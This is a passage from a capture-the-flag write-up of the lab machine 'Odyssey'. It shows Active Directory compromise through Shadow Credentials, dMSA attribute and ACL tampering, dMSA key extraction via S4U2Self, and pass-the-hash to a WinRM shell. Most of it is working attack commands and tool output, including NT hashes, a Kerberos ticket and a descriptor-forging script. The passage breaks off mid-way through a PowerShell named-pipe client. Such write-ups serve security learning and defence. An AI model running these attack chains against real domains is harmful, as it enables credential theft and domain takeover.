[*] Adding Key Credential with device ID '84ec8ac6-a58c-c42b-16fe-5e88fca02054' to the Key Credentials for 'svc-aegis-build'
[*] Successfully added Key Credential with device ID '84ec8ac6-a58c-c42b-16fe-5e88fca02054' to the Key Credentials for 'svc-aegis-build'
[*] Authenticating as 'svc-aegis-build' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'svc-aegis-build@odyssey.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'svc-aegis-build.ccache'
[*] Wrote credential cache to 'svc-aegis-build.ccache'
[*] Trying to retrieve NT hash for 'svc-aegis-build'
[*] Restoring the old Key Credentials for 'svc-aegis-build'
[*] Successfully restored the old Key Credentials for 'svc-aegis-build'
[*] NT hash for 'svc-aegis-build': bbc270509ec878cf516d5295fb4d774d
```

Authentication as the newly compromised service account was immediately verified:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ nxc ldap DC01.odyssey.htb -u svc-aegis-build -H bbc270509ec878cf516d5295fb4d774d
LDAP        172.16.0.10     389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:odyssey.htb)
LDAPS       172.16.0.10     636    DC01             [+] odyssey.htb\svc-aegis-build:bbc270509ec878cf516d5295fb4d774d
```

## dMSA Ouroboros Chain: Access to DC01 as svc-aegisdeploy

With valid credentials for svc-aegis-build, `bloodyAD` was used to enumerate objects the account could modify. Notable rights included write access on the account itself, `CREATE_CHILD` on `OU=Migrations`, and write access on svc-aegis-deploy:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ bloodyAD --host 172.16.0.10 -d odyssey.htb -u svc-aegis-build -p :bbc270509ec878cf516d5295fb4d774d get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=odyssey,DC=htb
permission: WRITE

distinguishedName: CN=svc-aegis-build,OU=Pipeline,DC=odyssey,DC=htb
permission: WRITE

distinguishedName: OU=Migrations,DC=odyssey,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=svc-aegis-deploy,OU=Migrations,DC=odyssey,DC=htb
permission: WRITE

distinguishedName: DC=odyssey.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=odyssey,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.odyssey.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=odyssey,DC=htb
permission: CREATE_CHILD
```

Inspection of the object `CN=dmsa-pipe-deploy,OU=Migrations,DC=odyssey,DC=htb` confirmed it was a **Delegated Managed Service Account (msDS-DelegatedManagedServiceAccount)**. Key attributes included an active delegated state (msDS-DelegatedMSAState: 2), membership granted to the SID of svc-aegis-build, and an existing link to svc-aegis-deploy via `msDS-ManagedAccountPrecededByLink`:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ bloodyAD --host 172.16.0.10 -d odyssey.htb -u svc-aegis-build -p :bbc270509ec878cf516d5295fb4d774d \
  get object 'CN=dmsa-pipe-deploy,OU=Migrations,DC=odyssey,DC=htb'

distinguishedName: CN=dmsa-pipe-deploy,OU=Migrations,DC=odyssey,DC=htb
accountExpires: 9999-12-31 23:59:59.999999+00:00
badPasswordTime: 1601-01-01 00:00:00+00:00
badPwdCount: 0
cn: dmsa-pipe-deploy
codePage: 0
countryCode: 0
dNSHostName: dmsa-pipe-deploy.odyssey.htb
dSCorePropagationData: 1601-01-01 00:00:00+00:00
instanceType: 4
isCriticalSystemObject: False
lastLogoff: 1601-01-01 00:00:00+00:00
lastLogon: 1601-01-01 00:00:00+00:00
localPolicyFlags: 0
logonCount: 0
msDS-DelegatedMSAState: 2
msDS-GroupMSAMembership: O:S-1-5-32-544D:(A;;0xf01ff;;;S-1-5-21-4175332977-3571604968-1809176562-6101)
msDS-ManagedAccountPrecededByLink: CN=svc-aegis-deploy,OU=Migrations,DC=odyssey,DC=htb
msDS-ManagedPasswordId: AQAAAEtEU0sCAAAAbAEAAA0AAAAOAAAAEJ/9qOf7/g0VFSGHxWnDLwAAAAAYAAAAGAAAAG8AZAB5AHMAcwBlAHkALgBoAHQAYgAAAG8AZAB5AHMAcwBlAHkALgBoAHQAYgAAAA==
msDS-ManagedPasswordInterval: 30
msDS-SupersededManagedAccountLinkBL: CN=svc-aegis-deploy,OU=Migrations,DC=odyssey,DC=htb
msDS-SupportedEncryptionTypes: 28
nTSecurityDescriptor: O:S-1-5-21-4175332977-3571604968-1809176562-6101G:S-1-5-21-4175332977-3571604968-1809176562-513D:AI(OD;;CR;00299570-246d-11d0-a768-00aa006e0529;;S-1-1-0)(OD;;RP;e362ed86-b728-0842-b27d-2dea7a9df218;;S-1-1-0)(OA;;WP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-4175332977-3571604968-1809176562-6101)(OA;;WP;bf967950-0de6-11d0-a285-00aa003049e2;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-4175332977-3571604968-1809176562-6101)(OA;;WP;bf967953-0de6-11d0-a285-00aa003049e2;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-4175332977-3571604968-1809176562-6101)(OA;;WP;3e0abfd0-126a-11d0-a060-00aa006c33ed;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-4175332977-3571604968-1809176562-6101)(OA;;SW;72e39547-7b18-11d1-adef-00c04fd8d5cd;;S-1-5-21-4175332977-3571604968-1809176562-6101)(OA;;SW;f3a64788-5306-11d1-a9c5-0000f80367c1;;S-1-5-21-4175332977-3571604968-1809176562-6101)(OA;;WP;4c164200-20c0-11d0-a768-00aa006e0529;;S-1-5-21-4175332977-3571604968-1809176562-6101)(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)(OA;;SW;72e39547-7b18-11d1-adef-00c04fd8d5cd;;S-1-5-10)(OA;;SW;f3a64788-5306-11d1-a9c5-0000f80367c1;;S-1-5-10)(OA;;0x30;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-10)(A;;0x301d4;;;S-1-5-21-4175332977-3571604968-1809176562-6101)(A;;0xf01ff;;;S-1-5-21-4175332977-3571604968-1809176562-512)(A;;0xf01ff;;;S-1-5-32-548)(A;;0xf01ff;;;S-1-5-18)(OA;CIIOID;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;RP;4c164200-20c0-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIID;0x30;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-4175332977-3571604968-1809176562-526)(OA;CIID;0x30;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-4175332977-3571604968-1809176562-527)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-3-0)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-10)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIIOID;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-10)(OA;CIIOID;0x20094;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;0x20094;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;0x20094;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;OICIID;0x30;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;S-1-5-10)(OA;CIID;0x130;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;S-1-5-10)(A;CIID;0xf01ff;;;S-1-5-21-4175332977-3571604968-1809176562-519)(A;CIID;LC;;;S-1-5-32-554)(A;CIID;0xf01bd;;;S-1-5-32-544)
name: dmsa-pipe-deploy
objectCategory: CN=ms-DS-Delegated-Managed-Service-Account,CN=Schema,CN=Configuration,DC=odyssey,DC=htb
objectClass: top; person; organizationalPerson; user; computer; msDS-DelegatedManagedServiceAccount
objectGUID: de5dec73-d19f-4737-856e-c670161e2cf7
objectSid: S-1-5-21-4175332977-3571604968-1809176562-16601
primaryGroupID: 515
pwdLastSet: 2026-09-16 04:44:57.165308+00:00
sAMAccountName: dmsa-pipe-deploy$
sAMAccountType: 805306369
uSNChanged: 241942
uSNCreated: 241939
userAccountControl: WORKSTATION_TRUST_ACCOUNT
whenChanged: 2026-09-16 04:44:57+00:00
whenCreated: 2026-09-16 04:44:57+00:00
```

`GenericAll` was granted over the dMSA to svc-aegis-build, after which the `msDS-ManagedAccountPrecededByLink` attribute was explicitly set (or confirmed) to point at svc-aegis-deploy:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ bloodyAD --host 172.16.0.10 -d odyssey.htb -u svc-aegis-build -p :bbc270509ec878cf516d5295fb4d774d \
  add genericAll 'CN=dmsa-pipe-deploy,OU=Migrations,DC=odyssey,DC=htb' svc-aegis-build
[+] svc-aegis-build has now GenericAll on CN=dmsa-pipe-deploy,OU=Migrations,DC=odyssey,DC=htb
```

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ bloodyAD --host DC01.odyssey.htb -d odyssey.htb -u svc-aegis-build -p :bbc270509ec878cf516d5295fb4d774d set object 'dmsa-pipe-deploy$' msDS-ManagedAccountPrecededByLink -v 'CN=svc-aegis-deploy,OU=Migrations,DC=odyssey,DC=htb'

[+] dmsa-pipe-deploy$'s msDS-ManagedAccountPrecededByLink has been updated
```

A second `Shadow Credentials` attack was then executed directly against the dMSA, producing a usable certificate and private key:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ certipy-ad shadow add -u svc-aegis-build -hashes ':bbc270509ec878cf516d5295fb4d774d' -account 'dmsa-pipe-deploy$' -dc-ip 172.16.0.10
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'dmsa-pipe-deploy$'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'a004dd0e-a8c3-841e-629c-0f488fd0e7c1'
[*] Adding Key Credential with device ID 'a004dd0e-a8c3-841e-629c-0f488fd0e7c1' to the Key Credentials for 'dmsa-pipe-deploy$'
[*] Successfully added Key Credential with device ID 'a004dd0e-a8c3-841e-629c-0f488fd0e7c1' to the Key Credentials for 'dmsa-pipe-deploy$'
[*] Saving certificate and private key to 'dmsa-pipe-deploy.pfx'
[*] Saved certificate and private key to 'dmsa-pipe-deploy.pfx'
```

The object SIDs of both the controlling account and the dMSA were confirmed for reference:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ bloodyAD --host 172.16.0.10 -d odyssey.htb -u svc-aegis-build -p :bbc270509ec878cf516d5295fb4d774d get object 'svc-aegis-build' --attr objectSid

distinguishedName: CN=svc-aegis-build,OU=Pipeline,DC=odyssey,DC=htb
objectSid: S-1-5-21-4175332977-3571604968-1809176562-6101
```

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ bloodyAD --host 172.16.0.10 -d odyssey.htb -u svc-aegis-build -p :bbc270509ec878cf516d5295fb4d774d get object 'dmsa-pipe-deploy$' --attr objectSid

distinguishedName: CN=dmsa-pipe-deploy,OU=Migrations,DC=odyssey,DC=htb
objectSid: S-1-5-21-4175332977-3571604968-1809176562-16601
```

This chain demonstrates a multi-stage escalation: initial Shadow Credentials abuse of a service account that already held privileged rights over a dMSA, followed by explicit ACL and attribute manipulation of the dMSA, and a second Shadow Credentials attack that yielded full cryptographic control over the delegated managed service account. The resulting access enables authentication and further lateral movement under the identity of `dmsa-pipe-deploy$`.

With cryptographic control over the Delegated Managed Service Account (dmsa-pipe-deploy$) already obtained via Shadow Credentials, the next objective was to recover the credentials of the account it is linked to (svc-aegis-deploy). This required two preparatory steps: rewriting the msDS-GroupMSAMembership attribute and then performing a specialised `S4U2Self` request that surfaces the preceding managed account’s keys.

A custom security descriptor was generated that grants full control (`0xf01ff`) to both the dMSA itself and the already-compromised svc-aegis-build principal:

```python
# generate_security_descriptor.py
from winacl.dtyp.security_descriptor import SECURITY_DESCRIPTOR
import base64

service_account_sid = "S-1-5-21-4175332977-3571604968-1809176562-16601"
principal_sid       = "S-1-5-21-4175332977-3571604968-1809176562-6101"
descriptor_sddl     = f"O:SYD:(A;;0xf01ff;;;{service_account_sid})(A;;0xf01ff;;;{principal_sid})"
security_descriptor = SECURITY_DESCRIPTOR.from_sddl(descriptor_sddl)
print(base64.b64encode(security_descriptor.to_bytes()).decode())
```

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ python3 sec_decryptor.py
AQAEgBQAAAAAAAAAAAAAACAAAAABAQAAAAAABRIAAAACAFAAAgAAAAAAJAD/AQ8AAQUAAAAAAAUVAAAAcYbe+Ohd4tTy19Vr2UAAAAAAJAD/AQ8AAQUAAAAAAAUVAAAAcYbe+Ohd4tTy19Vr1RcAAA==
```

The resulting base64 blob was written directly into the `msDS-GroupMSAMembership` attribute of the dMSA. This attribute is itself a security descriptor that controls which principals are authorised to retrieve the managed password of a gMSA or dMSA. By replacing it, the attacker ensured that both the dMSA and svc-aegis-build retained (or regained) the necessary rights:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ bloodyAD --host DC01.odyssey.htb -d odyssey.htb -u svc-aegis-build -p :bbc270509ec878cf516d5295fb4d774d set object 'dmsa-pipe-deploy$' msDS-GroupMSAMembership --raw --b64 -v 'AQAEgBQAAAAAAAAAAAAAACAAAAABAQAAAAAABRIAAAACAFAAAgAAAAAAJAD/AQ8AAQUAAAAAAAUVAAAAcYbe+Ohd4tTy19Vr2UAAAAAAJAD/AQ8AAQUAAAAAAAUVAAAAcYbe+Ohd4tTy19Vr1RcAAA==' 
[+] dmsa-pipe-deploy$'s msDS-GroupMSAMembership has been updated
```

Authentication as the dMSA was then performed using the previously obtained PFX certificate. Certipy retrieved a usable TGT and the current NT hash of the managed account:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ certipy-ad auth -pfx dmsa-pipe-deploy.pfx -dc-ip 172.16.0.10 -username 'dmsa-pipe-deploy$' -domain odyssey.htb
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     No identities found in this certificate
[!] Could not find identity in the provided certificate
[*] Using principal: 'dmsa-pipe-deploy$@odyssey.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'dmsa-pipe-deploy.ccache'
[*] Wrote credential cache to 'dmsa-pipe-deploy.ccache'
[*] Trying to retrieve NT hash for 'dmsa-pipe-deploy$'
[*] Got hash for 'dmsa-pipe-deploy$@odyssey.htb': aad3b435b51404eeaad3b435b51404ee:e11f2a4644f530c8a57c0d52614d5e7b
```

The critical step exploited a design characteristic of Delegated Managed Service Accounts. When a dMSA is configured with `msDS-ManagedAccountPrecededByLink` (pointing at the account it supersedes), a properly formed `S4U2Self` request against the dMSA causes the Key Distribution Center to embed **both the current keys of the dMSA and the previous keys of the linked account** inside the returned `Ticket-Granting Service (TGS)` ticket. The tool `badS4U2self` with the `--dmsa` flag performs exactly this request:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ badS4U2self 'kerberos+ccache://odyssey.htb\dmsa-pipe-deploy$:dmsa-pipe-deploy.ccache@172.16.0.10' 'krbtgt/odyssey.htb@odyssey.htb' 'dmsa-pipe-deploy$@odyssey.htb' --dmsa
[+] Trying to get SPN with dmsa-pipe-deploy$
[+] Success!

Realm        : ODYSSEY.HTB
Sname        : krbtgt/ODYSSEY.HTB
UserName     : dmsa-pipe-deploy$
UserRealm    : odyssey.htb
StartTime    : 2026-09-16 04:59:50+00:00
EndTime      : 2026-09-16 14:59:06+00:00
RenewTill    : 2026-09-17 04:58:55+00:00
Flags        : forwardable, renewable, enc-pa-rep, pre-authent
Keytype      : 18
Key          : DyA5p3CZpDVY0U+yc+XAlrrjTDlm+BDpEK1yqw+mJ2Y=
EncodedKirbi : 

    doIGBzCCBgOgAwIBBaEDAgEWooIE9TCCBPFhggTtMIIE6aADAgEFoQ0bC09EWVNTRVkuSFRCoiAwHqADAgECoRcwFRsGa3JidGd0
    GwtPRFlTU0VZLkhUQqOCBK8wggSroAMCARKhAwIBAqKCBJ0EggSZrMyQGVNbmLdaQrGjnHiUA7DZKflQU6frov0wu3smp4BSJgiq
    /RQQzy4gvoJPOZEcthoXIJ/KTfjNRGSgWK7W/XMhpS/He22qe+WrrBWkQHT5K9bLjkp//BzMnTDOT7ua+r3+bW9XZrcK/TJFytrk
    JOnk2PBqCyjCjYBdzJ5xh9mCBf7Ryz03imV8F6Ro6MFLnrUtIO2v47rX+Jqvh0+3FmBtT2RupEkPeiW2cN/fMFyDfdR2m9RPIdqp
    d+YIC1fWwIcbWNlLo0oofwPjrowz+bgUF87rjgRWEk7vh8fuFX1pFp/ico+qjweguWqtya73bfhK1JBrEIyho16EVyz9670hp6IM
    z1rdAAID210AzAbeAhU8i1hYw7aqdsm5JPxZD9gR92aJbkz6aZcy6Ig3QI+J0yfnvNs1rj4BtsfDb7ndaGs8eqXl/C30iTc0I+l8
    NfYuz/Gv8Y5WxjS4jenPEgFtNhOOAJnt0IWP/EoDX0BgtU0FxVFOTAYk1yzOsq/xNaQ0kszaly7ncDe2PUoQhv2QuLvzZhn28OLs
    jwMRvHENm0lRI/FBiGgZwtc8mctQCebugzAKTOE9P0BzQyrbuylCfbWh+uULDcjNMph4JB6CqZkJX3ML5hQ7hRGROxwDPZv3ueti
    mIsRLMb76OJW0g8dfRm0StKCZAdzvfFBwEaeHEbuFTct5DwcDKP12BrF8mopd52KncjZuFvgrjVqSjr7tQtxOpXrzZg102ppz0++
    czsV9qpO93guHFhn72Tj1T4Noc3KYzAK6RgzjMXLNpWUA09FSlr8DVv1AiAMJEQPErfFFn6i8fwWhAGx/kF5DSL7IPPaHaiEKjZ4
    82ghmev6BC/T2ZhGWlGA+17cTgdSyQQLXvTFTibvF6J8AocyMVK96G+kymFmxkITdZ8NAusYGuIHVsCXvxa2/RCpiR4Kxg5gmGKp
    MjfmRwg+1fEwFPKShC6nFdO/JP4ElrvcWitNVaNXkVyPDsWEgyWYh+bACKYouZXa+RdEx/pRZaCGGOBiJIQvnJ49gbHNzOSAhm+A
    6MHTEJ0h7tTTHJUgBaVmm7WzVTdLiyVtp8VZm/GSGufYoqr/79Q0auCTdBw7KvXSGuz1HrOeeyOOlWTHBpnBlHqjrjFbzBeujd44
    sHfpIEK8L5AuZ32zI/7l31E9JMYPw4zKU2Bm1na7MHfrB1IuOuQPaldKOroP0M/iQb/o9riy4svL9RQwvJ6wJF1EuF4OTEckMdvZ
    fYXzc8S9MdE7YvK+TqCTxrP8G+ppMg4dpiJorPvrCyBT5Qs0v1DU0f0+7dEgXqEcze1Xvuc2Y7lggHAUzQ/6LExMAZeyXF6t5Cj0
    x0mOAbWA0VkAbeZkddymGOAxCuRn80wLdcAB4wrCpPeA/zOmc6nmDXpjBHJr21+lmS4gvK4ZHzYMidBIcHeXZD/bxNntNGLt3nKI
    a21aUiKcVAuZ3ow1S7B/DNSHh4eQMDx61WT0Xv6+DoN72CSlM67SNgbXBWjQ9v7FGtofv2PalwhSByqPQ/Fmx9MadQ7ae4gq4cix
    CEQR1h+OBAJ+Ns4+vaj/KKOB/TCB+qADAgEAooHyBIHvfYHsMIHpoIHmMIHjMIHgoCswKaADAgESoSIEIA8gOadwmaQ1WNFPsnPl
    wJa640w5ZvgQ6RCtcqsPpidmoQ0bC29keXNzZXkuaHRioh4wHKADAgEBoRUwExsRZG1zYS1waXBlLWRlcGxveSSjBQMDAEChpBEY
    DzIwMjYwOTE2MDQ1OTA2WqURGA8yMDI2MDkxNjA0NTk1MFqmERgPMjAyNjA5MTYxNDU5MDZapxEYDzIwMjYwOTE3MDQ1ODU1WqgN
    GwtPRFlTU0VZLkhUQqkgMB6gAwIBAqEXMBUbBmtyYnRndBsLT0RZU1NFWS5IVEI=

dMSA current keys found in TGS:
AES256: 1de56b122e25a53a0da8f4412b2f2825666bd7eea7b6e7173bfcf5ab1842ab86
AES128: 17a4e01b9746c7a4c8656c39938ff0ed
RC4: e11f2a4644f530c8a57c0d52614d5e7b

dMSA previous keys found in TGS (including keys of preceding managed accounts):
RC4: 3a5026b2aa5ef2cbb7cb6a7be3a2bcfa
[+] Done!
```

The recovered RC4 hash `3a5026b2aa5ef2cbb7cb6a7be3a2bcfa` belongs to the preceding managed account svc-aegis-deploy. This hash was immediately validated over WinRM and used to obtain an interactive shell:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ nxc winrm DC01.odyssey.htb -u svc-aegis-deploy -H 3a5026b2aa5ef2cbb7cb6a7be3a2bcfa
WINRM       172.16.0.10     5985   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:odyssey.htb)
WINRM       172.16.0.10     5985   DC01             [+] odyssey.htb\svc-aegis-deploy:3a5026b2aa5ef2cbb7cb6a7be3a2bcfa (Pwn3d!)
```

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ evil-winrm -i DC01.odyssey.htb -u svc-aegis-deploy -H 3a5026b2aa5ef2cbb7cb6a7be3a2bcfa
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                          
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                     
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-aegis-deploy\Documents>
```

This stage therefore completed the escalation from the original computer account all the way to an interactive session as `svc-aegis-deploy` by chaining Shadow Credentials, ACL manipulation, and the dMSA key-recovery primitive.

# Privilege Escalation

## YAML Deserialization Behind HMAC Validation

### Retrieving the Operator Key via a Decryption Oracle

During post-exploitation enumeration as svc-aegis-deploy, winPEAS was used to inspect named pipes and their discretionary access control lists (DACLs). Several pipes were found to grant **Everyone** the WriteData / CreateFiles rights:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FIFamAxUnpiWarVeRazWw%252FScreenshot%2520%283389%29.png%3Falt%3Dmedia%26token%3Deac8d085-26dc-4e15-8a1f-e52a4c7e52c9&width=768&dpr=3&quality=100&sign=ab8fa61faf2c7267925cc14b45e1f94d&sv=3)

Named pipes are a common inter-process communication (IPC) mechanism on Windows. When a pipe is created with a weak DACL that allows `Everyone` (or `Authenticated Users`) to write data, any local user can connect to it and send arbitrary data to the process that owns the pipe. If that process runs as a high-privileged account (SYSTEM, a service account with SeImpersonatePrivilege, etc.) and does not properly validate or sanitise the incoming data, the pipe becomes a classic privilege-escalation vector. Common abuse techniques include:

* Sending malformed or specially crafted messages that trigger a buffer overflow, command injection, or deserialisation vulnerability inside the listening service.
* Abusing pipes that implement a poorly protected RPC interface.
* Leveraging pipes that are used by services running as SYSTEM to perform actions on behalf of the caller (e.g., the well-known `eventlog` pipe has historically been involved in various local privilege escalations).

In this case the presence of multiple pipes with `Everyone:WriteData` immediately flags them as high-value targets for further investigation.

While reviewing services that might be interacting with these pipes (or that run under interesting accounts), the `AegisStreamCollector` service was examined:

```powershell
*Evil-WinRM* PS C:\programdata> reg query "HKLM\SYSTEM\CurrentControlSet\Services\AegisStreamCollector" /v ImagePath

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AegisStreamCollector                                                                        
    ImagePath    REG_EXPAND_SZ    C:\Program Files\Aegis Stream Collector\AegisStreamSvc.exe                                                     
                                                                                                                                                 
*Evil-WinRM* PS C:\programdata> reg query "HKLM\SYSTEM\CurrentControlSet\Services\AegisStreamCollector" /v ObjectName
                                                                                                                                                 
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AegisStreamCollector                                                                        
    ObjectName    REG_SZ    ODYSSEY\svc-aegis-stream
```

The service binary lives at `C:\Program Files\Aegis Stream Collector\AegisStreamSvc.exe` and is configured to run under the domain account `ODYSSEY\svc-aegis-stream`. Combined with the earlier weak named-pipe permissions, this strongly suggests that the Aegis Stream Collector service (or one of its components) may be listening on one of the writable pipes and processing data with the privileges of `svc-aegis-stream`. This makes both the service binary and the named pipes high-priority targets for reverse-engineering or further exploitation in the next stage of the escalation path.

Back to the Bloodhound, Two critical attack paths involving SVC-AEGIS-STREAM were identified.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F6AXMzIlVkBClfj1gYWP8%252FScreenshot%2520%283390%29.png%3Falt%3Dmedia%26token%3D51dd201b-7526-4ca2-bc71-643fce66a72f&width=768&dpr=3&quality=100&sign=0e486c2d2111318ee950438219da3d7d&sv=3)

The first graph shows that `svc-aegis-stream` is a member of `DOMAIN USERS`. Because DOMAIN `USERS` (and by extension `AUTHENTICATED USERS`) holds **Enroll** rights on multiple certificate templates (`EFS, CLIENTAUTH, USERSIGNATURE, USER`) and can enroll against the Enterprise CA `D9-ISSUING-CA-01`, the account can request certificates. More importantly, the same account also possesses **GetChangesAll** on the domain object itself.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FBPYH75JI8HtSPAfn6e8k%252FScreenshot%2520%283392%29.png%3Falt%3Dmedia%26token%3Df7888fdb-76ed-4cd2-8b9a-26b4ef35842d&width=768&dpr=3&quality=100&sign=2a4333d486ac325bd49bdf8c6f719888&sv=3)

The second, more direct graph confirms the ultimate impact of that right: `svc-aegis-stream` has the **DCSync** privilege on the domain `ODYSSEY.HTB`. Any principal that can authenticate as this account can therefore perform a full domain replication and extract every account’s NT hash (including Domain Admins and the KRBTGT account).

With an interactive shell as `svc-aegis-deploy`, the Aegis Stream Collector service was examined. Its working directory under `C:\ProgramData\AegisStream` contained configuration, encrypted key material, and a management named pipe (`AegisStreamMgmt`) that the service listens on while running as `svc-aegis-stream`.

```powershell
*Evil-WinRM* PS C:\programdata> cd AegisStream
*Evil-WinRM* PS C:\programdata\AegisStream> tree /f /a
Folder PATH listing
Volume serial number is 9332-997A
C:.
+---config
|       service.json
|       watchdog.manifest
|
+---dpapi
|       operator.wrap.bin
|
+---keys
|       auditor.key
|       operator.key
|       operator.key.enc
|       viewer.key
|
+---logs
\---telemetry
    |   current.bin
    |
    \---archived
            current-2026-Q1.bin
```

The service exposes a custom binary protocol over the named pipe. Packets are authenticated with an HMAC-SHA256 key and can carry YAML payloads that are later deserialized by the service. The attacker first recovered the HMAC key by abusing a legitimate “telemetry unwrap” command that the service itself implements.

A PowerShell client was written that constructs a properly authenticated packet requesting decryption of the DPAPI-wrapped operator key:

```powershell
# telemetry_unwrap.ps1
$authMaterial = [IO.File]::ReadAllBytes('C:/ProgramData/AegisStream/keys/viewer.key')
$encryptedPackage = [IO.File]::ReadAllBytes('C:/ProgramData/AegisStream/dpapi/operator.wrap.bin')
$commandToken = [Text.Encoding]::UTF8.GetBytes('DIAG_DECRYPT_TELEMETRY_BLOB')

$macEngine = New-Object System.Security.Cryptography.HMACSHA256(,$authMaterial)
$concatBuffer = New-Object byte[] ($commandToken.Length + $encryptedPackage.Length)
